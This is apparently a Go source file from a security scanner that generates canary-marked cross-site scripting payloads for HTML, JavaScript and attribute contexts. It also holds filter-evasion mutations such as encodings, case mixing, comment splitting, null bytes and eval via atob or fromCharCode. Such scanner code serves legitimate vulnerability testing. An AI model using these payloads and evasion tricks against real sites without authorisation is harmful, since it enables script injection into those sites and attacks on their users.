// Package generator provides XSS payload generation with various encoding strategies
package generator

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// ContextType represents the injection context
type ContextType int

const (
	ContextHTML ContextType = iota
	ContextJavaScript
	ContextAttribute
	ContextJSON
	ContextCSS
	ContextURL
	ContextComment
	ContextCDATA
	ContextXML
)

// Payload represents a generated XSS payload
type Payload struct {
	Value       string
	Context     ContextType
	Description string
	Encoding    string
	Priority    int
}

// Generator handles XSS payload generation
type Generator struct {
	canaryPlaceholder string
}

// NewGenerator creates a new payload generator
func NewGenerator() *Generator {
	return &Generator{
		canaryPlaceholder: "CANARY_PLACEHOLDER",
	}
}

// Generate creates payloads for a specific context
func (g *Generator) Generate(ctx ContextType, canary string) []Payload {
	var payloads []Payload

	switch ctx {
	case ContextHTML:
		payloads = g.generateHTMLPayloads(canary)
	case ContextJavaScript:
		payloads = g.generateJavaScriptPayloads(canary)
	case ContextAttribute:
		payloads = g.generateAttributePayloads(canary)
	default:
		payloads = g.generateHTMLPayloads(canary)
	}

	return payloads
}

// generateHTMLPayloads creates HTML context payloads
func (g *Generator) generateHTMLPayloads(canary string) []Payload {
	templates := []struct {
		template    string
		description string
		priority    int
	}{
		{`<script>window["%s"]=1</script>`, "script-tag", 1},
		{`<script>window['%s']=1</script>`, "script-tag-single-quote", 1},
		{`<svg onload='window["%s"]=1'>`, "svg-onload", 2},
		{`<img src=x onerror='window["%s"]=1'>`, "img-onerror", 2},
		{`<body onload='window["%s"]=1'>`, "body-onload", 3},
		{`<svg><script>window['%s']=1</script></svg>`, "svg-script", 2},
		{`<math><mi xlink:href="javascript:window['%s']=1">click</mi></math>`, "mathml-xlink", 4},
		{`'"--></script><script>window['%s']=1</script>`, "script-breakout", 1},
		{`'"--></style></script><svg onload='window["%s"]=1'>`, "style-script-breakout", 1},
		{`<script>/*%s*/</script>`, "script-comment", 3},
		{`javascript:/*--></title></style></textarea></script></xmp><svg onload='window["%s"]=1'>`, "javascript-polyglot", 1},
	}

	payloads := make([]Payload, 0, len(templates))
	for _, t := range templates {
		payloads = append(payloads, Payload{
			Value:       fmt.Sprintf(t.template, canary),
			Context:     ContextHTML,
			Description: t.description,
			Priority:    t.priority,
		})
	}

	return payloads
}

// generateJavaScriptPayloads creates JavaScript context payloads
func (g *Generator) generateJavaScriptPayloads(canary string) []Payload {
	templates := []struct {
		template    string
		description string
		priority    int
	}{
		{`;window["%s"]=1//`, "semicolon-injection", 1},
		{`';window["%s"]=1//`, "single-quote-breakout", 1},
		{`";window["%s"]=1//`, "double-quote-breakout", 1},
		{`window["%s"]=1//`, "direct-injection", 2},
		{`*/window["%s"]=1/*`, "comment-breakout", 2},
		{`'-window["%s"]=1-'`, "dash-injection-single", 3},
		{`"-window["%s"]=1-"`, "dash-injection-double", 3},
		{"`${window[\"%s\"]=1}`", "template-literal", 2},
		{`${window['%s']=1}`, "template-expression", 2},
		{`<script>eval(String.fromCharCode(%s))</script>`, "charcode-eval", 3},
		{`<script>eval(atob('%s'))</script>`, "base64-eval", 3},
	}

	payloads := make([]Payload, 0, len(templates))
	for _, t := range templates {
		value := t.template
		if strings.Contains(t.template, "fromCharCode") {
			value = fmt.Sprintf(t.template, stringToCharCodes(fmt.Sprintf(`window["%s"]=1`, canary)))
		} else if strings.Contains(t.template, "atob") {
			value = fmt.Sprintf(t.template, base64Encode(fmt.Sprintf(`window["%s"]=1`, canary)))
		} else {
			value = fmt.Sprintf(t.template, canary)
		}

		payloads = append(payloads, Payload{
			Value:       value,
			Context:     ContextJavaScript,
			Description: t.description,
			Priority:    t.priority,
		})
	}

	return payloads
}

// generateAttributePayloads creates attribute context payloads
func (g *Generator) generateAttributePayloads(canary string) []Payload {
	templates := []struct {
		template    string
		description string
		priority    int
	}{
		{`" onload='window["%s"]=1' "`, "dquote-onload", 1},
		{`' onload='window["%s"]=1' '`, "squote-onload", 1},
		{`" onfocus='window["%s"]=1' "`, "dquote-onfocus", 1},
		{`' onfocus='window["%s"]=1' '`, "squote-onfocus", 1},
		{`" onerror='window["%s"]=1' "`, "dquote-onerror", 1},
		{`' onerror='window["%s"]=1' '`, "squote-onerror", 1},
		{`" onmouseover='window["%s"]=1' "`, "dquote-onmouseover", 2},
		{`' onmouseover='window["%s"]=1' '`, "squote-onmouseover", 2},
		{`" autofocus onfocus='window["%s"]=1' "`, "autofocus-onfocus", 1},
		{`' autofocus onfocus='window["%s"]=1' '`, "squote-autofocus-onfocus", 1},
		{`"--><script>window['%s']=1</script><!--`, "comment-injection", 2},
	}

	payloads := make([]Payload, 0, len(templates))
	for _, t := range templates {
		payloads = append(payloads, Payload{
			Value:       fmt.Sprintf(t.template, canary),
			Context:     ContextAttribute,
			Description: t.description,
			Priority:    t.priority,
		})
	}

	return payloads
}

// GeneratePolyglot creates a polyglot payload that works in multiple contexts
func (g *Generator) GeneratePolyglot(canary string) Payload {
	template := `javascript:/*--></title></style></textarea></script></xmp><svg onload='window["%s"]=1'>`
	return Payload{
		Value:       fmt.Sprintf(template, canary),
		Context:     ContextHTML,
		Description: "polyglot-template",
		Priority:    1,
	}
}

// MutatePayload applies various mutations to a payload
func (g *Generator) MutatePayload(payload Payload) []Payload {
	mutations := []Payload{payload}

	// URL encoding
	mutations = append(mutations, Payload{
		Value:       urlEncode(payload.Value),
		Context:     payload.Context,
		Description: payload.Description + "-urlencoded",
		Encoding:    "url",
		Priority:    payload.Priority + 1,
	})

	// Double URL encoding
	mutations = append(mutations, Payload{
		Value:       urlEncode(urlEncode(payload.Value)),
		Context:     payload.Context,
		Description: payload.Description + "-double-urlencoded",
		Encoding:    "double-url",
		Priority:    payload.Priority + 2,
	})

	// Unicode escape
	mutations = append(mutations, Payload{
		Value:       unicodeEscape(payload.Value),
		Context:     payload.Context,
		Description: payload.Description + "-unicode",
		Encoding:    "unicode",
		Priority:    payload.Priority + 2,
	})

	// HTML entity encoding
	mutations = append(mutations, Payload{
		Value:       htmlEntityEncode(payload.Value),
		Context:     payload.Context,
		Description: payload.Description + "-html-entity",
		Encoding:    "html-entity",
		Priority:    payload.Priority + 2,
	})

	// Case variations
	mutations = append(mutations, Payload{
		Value:       caseVariation(payload.Value),
		Context:     payload.Context,
		Description: payload.Description + "-mixed-case",
		Encoding:    "mixed-case",
		Priority:    payload.Priority + 1,
	})

	return mutations
}

// Helper encoding functions

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func hexEncode(s string) string {
	result := ""
	for _, c := range s {
		result += fmt.Sprintf("\\x%02x", c)
	}
	return result
}

func unicodeEscape(s string) string {
	result := ""
	for _, c := range s {
		if c < 128 {
			result += string(c)
		} else {
			result += fmt.Sprintf("\\u%04x", c)
		}
	}
	// Escape special chars
	result = strings.ReplaceAll(result, "<", "\\u003c")
	result = strings.ReplaceAll(result, ">", "\\u003e")
	return result
}

func htmlEntityEncode(s string) string {
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&#39;")
	return s
}

func urlEncode(s string) string {
	result := ""
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			result += string(c)
		} else {
			result += fmt.Sprintf("%%%02X", c)
		}
	}
	return result
}

func stringToCharCodes(s string) string {
	codes := make([]string, 0, len(s))
	for _, c := range s {
		codes = append(codes, fmt.Sprintf("%d", c))
	}
	return strings.Join(codes, ",")
}

func caseVariation(s string) string {
	result := ""
	for i, c := range s {
		if i%2 == 0 {
			result += strings.ToUpper(string(c))
		} else {
			result += strings.ToLower(string(c))
		}
	}
	return result
}

func toLower(s string) string {
	return strings.ToLower(s)
}

func toUpper(s string) string {
	return strings.ToUpper(s)
}

func injectComments(s string) string {
	// Insert HTML comments to break up patterns
	return strings.ReplaceAll(s, "script", "scr<!---->ipt")
}

func nullByteInject(s string) string {
	return strings.ReplaceAll(s, "<", "%00<")
}

func containsScriptTag(s string) bool {
	lower := strings.ToLower(s)
	return strings.Contains(lower, "<script") || strings.Contains(lower, "</script")
}
